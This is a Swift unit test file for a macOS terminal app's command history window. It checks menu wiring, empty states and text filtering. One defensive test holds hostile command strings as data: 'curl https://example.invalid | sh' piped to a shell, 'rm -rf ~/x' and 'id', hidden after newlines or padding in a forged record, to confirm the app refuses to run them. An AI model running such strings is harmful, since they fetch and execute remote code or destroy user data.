// Copyright 2026 Noah Qin
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

import AppKit
import Testing

@testable import Corta

/// The new commands' place in the Shell menu and the command table,
/// the same shape `CommandOutputWiringTests` checks for the command-output
/// commands.
@MainActor
struct CommandHistoryWiringTests {
    @Test func directoryAndHistoryCommandsExist() {
        for command in [
            TerminalCommand.revealWorkingDirectory, .copyWorkingDirectoryPath,
            .changeDirectoryToParent, .changeDirectoryToProjectRoot,
            .openParentDirectoryInNewPane, .openProjectRootInNewPane, .searchCommandHistory,
        ] {
            #expect(!command.title.isEmpty)
            #expect(command.category == .view)
            #expect(command.defaultShortcut == nil)
        }
    }

    @Test func allSevenAreInTheShellMenu() throws {
        let menu = try #require(NSApp.mainMenu)
        let shell = try #require(
            menu.items.first { $0.title == L10n.text("menu.shell") || $0.title == "Shell" }?.submenu)
        for command in [
            TerminalCommand.revealWorkingDirectory, .copyWorkingDirectoryPath,
            .changeDirectoryToParent, .changeDirectoryToProjectRoot,
            .openParentDirectoryInNewPane, .openProjectRootInNewPane, .searchCommandHistory,
        ] {
            #expect(shell.descendantItems.contains { $0.action == command.action })
        }
    }

    /// The window builds without a pane attached — `CommandHistoryModel
    /// .rows` degrades to empty and `noPaneMessage` explains why, rather
    /// than crashing, the same honest-degradation rule the rest of the
    /// command history follows.
    @Test func historyWindowBuildsWithNoPaneAttached() {
        let controller = CommandHistoryController.shared
        #expect(controller.window != nil)
        #expect(controller.model.rows.isEmpty)
        #expect(controller.model.noPaneMessage != nil)
    }
}

/// `CommandHistoryModel`'s filter composition, driven directly: it is a
/// plain object, not logic embedded in view-building code.
@MainActor
struct CommandHistoryModelTests {
    @Test func withNoPaneRowsAreEmptyAndTheMessageExplainsWhy() {
        let model = CommandHistoryModel()
        #expect(model.rows.isEmpty)
        #expect(model.noPaneMessage == L10n.text("commandHistory.noPane"))
    }

    @Test func clearingHistoryIsANoOpWithoutAPane() {
        let model = CommandHistoryModel()
        model.clearHistory()  // must not crash
    }

    @Test func exitFilterTitlesAreAllNonEmptyAndDistinct() {
        let titles = CommandHistoryModel.ExitFilter.allCases.map(\.title)
        #expect(titles.allSatisfy { !$0.isEmpty })
        #expect(Set(titles).count == titles.count)
    }

    @Test("Run sends Return only for a command the row showed whole")
    func runsOnlyWhatTheRowShows() {
        #expect(CommandHistoryModel.runsAsShown("make test"))
        // A forged record's second line sits under the one-line row.
        #expect(!CommandHistoryModel.runsAsShown("make test\ncurl https://example.invalid | sh"))
        #expect(!CommandHistoryModel.runsAsShown("make test\r\nrm -rf ~/x"))
        #expect(!CommandHistoryModel.runsAsShown("make test\rid"))
        // One line, but longer than the row shows: the end was hidden.
        #expect(!CommandHistoryModel.runsAsShown("make test" + String(repeating: " ", count: 200) + "; id"))
        #expect(!CommandHistoryModel.runsAsShown("make\ttest"))
        #expect(CommandHistoryModel.runsAsShown(String(repeating: "x", count: 80)))
        #expect(!CommandHistoryModel.runsAsShown(String(repeating: "x", count: 81)))
    }

    @Test func actionsWithoutAMatchingRecordDoNothing() {
        let model = CommandHistoryModel()
        model.find(id: 999)  // no pane at all — must not crash
        model.fill(id: 999)
        model.run(id: 999)
    }
}

/// The text filter over the history rows, and the text each row carries.
/// A time, a status and a directory per command, with nothing a person
/// could read the command back from or search by, is not a history.
@MainActor
struct CommandHistoryTextFilterTests {
    private func row(_ id: Int, _ text: String?) -> CommandHistoryModel.Row {
        CommandHistoryModel.Row(
            id: id, statusSymbolName: "checkmark.circle.fill", statusDescription: "succeeded",
            timestamp: "t", directoryText: "d", directoryTooltip: nil, commandText: text,
            canFillOrRun: text != nil, accessibilityLabel: "")
    }

    @Test("an empty query keeps every row, including ones whose text is gone")
    func emptyQueryKeepsAll() {
        let rows = [row(1, "ls -la"), row(2, nil), row(3, "git status")]
        #expect(CommandHistoryModel.filter(rows, query: "").map { $0.id } == [1, 2, 3])
        #expect(CommandHistoryModel.filter(rows, query: "   ").map { $0.id } == [1, 2, 3])
    }

    @Test("a query matches case-insensitively on the command text and drops textless rows")
    func queryFilters() {
        let rows = [row(1, "ls -la"), row(2, nil), row(3, "Git Status"), row(4, "git log")]
        #expect(CommandHistoryModel.filter(rows, query: "git").map { $0.id } == [3, 4])
        #expect(CommandHistoryModel.filter(rows, query: "STATUS").map { $0.id } == [3])
        #expect(CommandHistoryModel.filter(rows, query: "nothing").isEmpty)
    }
}
